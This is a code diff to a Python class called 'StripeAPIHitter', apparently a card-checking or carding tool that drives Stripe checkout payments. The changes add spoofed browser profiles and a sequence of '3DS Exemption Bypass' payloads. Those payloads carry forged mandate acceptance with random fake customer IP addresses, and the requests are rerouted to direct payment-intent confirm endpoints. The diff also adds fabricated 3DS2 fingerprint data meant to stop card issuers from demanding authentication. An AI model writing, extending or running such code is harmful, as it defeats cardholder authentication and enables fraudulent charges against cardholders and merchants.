@@ -1097,6 +1097,17 @@ class StripeAPIHitter:
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"Windows"'
             },
+            {
+                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+                "impersonate": "chrome131",
+                "platform": "Win32",
+                "color_depth": "24",
+                "screen_height": "1080",
+                "screen_width": "1920",
+                "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"'
+            },
         ]
         profile = random.choice(BROWSER_PROFILES)
         
@@ -1476,7 +1487,6 @@ class StripeAPIHitter:
                             err_msg = confirm_json.get('error', {}).get('message', '') or ''
                     except Exception as e:
                         pass
-                
                 # 1:1 Hitchk-Workflow Sequential 3DS Exemption Bypass
                 # If Stripe returns 3DS (authentication_required or requires_action), iterate through Hitchk's 3 distinct exemption payloads
                 _init_err_code = confirm_json.get('error', {}).get('code')
@@ -1491,14 +1501,13 @@ class StripeAPIHitter:
                             "payment_method_options[card][setup_future_usage]": "off_session",
                         },
                         # Attempt 2: Mandate Data Customer Acceptance with spoofed IP & Setup Future Usage
-                        # (MIT exemption requires sk_live — useless on client pk_live endpoints)
                         {
                             "payment_method_options[card][setup_future_usage]": "off_session",
                             "mandate_data[customer_acceptance][type]": "online",
                             "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                             "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"],
                         },
-                        # Attempt 3: Low-value TRA exemption flag (works on Radar-enabled merchants)
+                        # Attempt 3: Low-value TRA exemption + mandate
                         {
                             "payment_method_options[card][request_three_d_secure]": "automatic",
                             "payment_method_options[card][setup_future_usage]": "off_session",
@@ -1508,26 +1517,66 @@ class StripeAPIHitter:
                         }
                     ]
 
+                    # FIX 1+3: Route directly to /v1/payment_intents/{pi}/confirm once inner pi_ is known
+                    # payment_pages endpoint rejects mandate_data with parameter_unknown — pi confirm accepts it
+                    _hitchk_pi = None
+                    _hitchk_cs = None
+                    _hitchk_is_setup = False
+                    _raw_pi = confirm_json.get('payment_intent')
+                    _raw_si = confirm_json.get('setup_intent')
+                    if isinstance(_raw_pi, dict) and _raw_pi.get('id'):
+                        _hitchk_pi = _raw_pi['id']
+                        _hitchk_cs = _raw_pi.get('client_secret')
+                        _hitchk_is_setup = False
+                    elif isinstance(_raw_si, dict) and _raw_si.get('id'):
+                        _hitchk_pi = _raw_si['id']
+                        _hitchk_cs = _raw_si.get('client_secret')
+                        _hitchk_is_setup = True
+                    elif isinstance(_raw_pi, str) and _raw_pi.startswith('pi_') and client_secret:
+                        _hitchk_pi = _raw_pi
+                        _hitchk_cs = client_secret
+
+                    _hitchk_ep = "setup_intents" if _hitchk_is_setup else "payment_intents"
+                    _hitchk_confirm_url = (
+                        f"https://api.stripe.com/v1/{_hitchk_ep}/{_hitchk_pi}/confirm"
+                        if _hitchk_pi and _hitchk_cs
+                        else confirm_url
+                    )
+
                     for _attempt in _hitchk_attempts:
-                        # Build a clean attempt dictionary based on current confirm_data
                         _att_data = confirm_data.copy()
-                        # Clean out any previous exemption keys to prevent parameter contamination
                         for _k in list(_att_data.keys()):
-                            # Catch both top-level nested dicts (if used) and flat string keys
                             if _k.startswith('payment_method_options') or _k.startswith('mandate_data'):
                                 del _att_data[_k]
                         _att_data.update(_attempt)
 
+                        # Strip mandate_data if still hitting payment_pages endpoint — returns parameter_unknown
+                        if _hitchk_confirm_url == confirm_url and not is_pi and not is_seti:
+                            _att_data = {k: v for k, v in _att_data.items() if not k.startswith('mandate_data')}
+
+                        # Inject pi-confirm-specific fields if routing to direct intent endpoint
+                        if _hitchk_pi and _hitchk_cs and _hitchk_confirm_url != confirm_url:
+                            _att_data["client_secret"] = _hitchk_cs
+                            _att_data["use_stripe_sdk"] = "false"
+                            _att_data["return_url"] = checkout_page_url
+                            for _rm in ["init_checksum", "consent[terms_of_service]",
+                                        "client_attribution_metadata[client_session_id]",
+                                        "client_attribution_metadata[merchant_integration_source]",
+                                        "client_attribution_metadata[merchant_integration_version]",
+                                        "client_attribution_metadata[payment_method_selection_flow]",
+                                        "client_attribution_metadata[checkout_config_id]",
+                                        "expected_amount"]:
+                                _att_data.pop(_rm, None)
+
                         confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
-                        confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=_att_data, timeout=30))
+                        confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(_hitchk_confirm_url, headers=confirm_headers, data=_att_data, timeout=30))
                         confirm_json = confirm_res.json()
                         confirm_data = _att_data
-                        
+
                         err_code = confirm_json.get('error', {}).get('code')
                         err_decline = confirm_json.get('error', {}).get('decline_code')
                         err_msg = confirm_json.get('error', {}).get('message', '') or ''
-                        
-                        # Stop retrying if status is succeeded or declined (non-3DS)
+
                         status = confirm_json.get('status')
                         if status in ['succeeded', 'requires_capture', 'processing'] or (err_decline and err_decline != 'authentication_required' and err_code != 'authentication_required'):
                             break
@@ -1884,9 +1933,18 @@ class StripeAPIHitter:
                                     ]
                                     
                                     for var in auth_variations:
+                                        # Build real base64 fingerprintData blob — null signals a broken 3DS2 client
+                                        # to issuers, making them mandate a challenge regardless of exemption code
+                                        import base64 as _b64fp, json as _jfp, uuid as _ufp
+                                        _fp_blob = _b64fp.b64encode(_jfp.dumps({
+                                            "threeDSServerTransID": _tds_server_trans_id or str(_ufp.uuid4()),
+                                            "completed": var["fingerprintAttempted"],
+                                            "browserJavaEnabled": False,
+                                            "browserJavascriptEnabled": True
+                                        }).encode()).decode().rstrip("=")
                                         browser = {
                                             "fingerprintAttempted": var["fingerprintAttempted"],
-                                            "fingerprintData": None,
+                                            "fingerprintData": _fp_blob if var["fingerprintAttempted"] else None,
                                             "challengeWindowSize": "05",
                                             "threeDSCompInd": var["threeDSCompInd"],
                                             "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
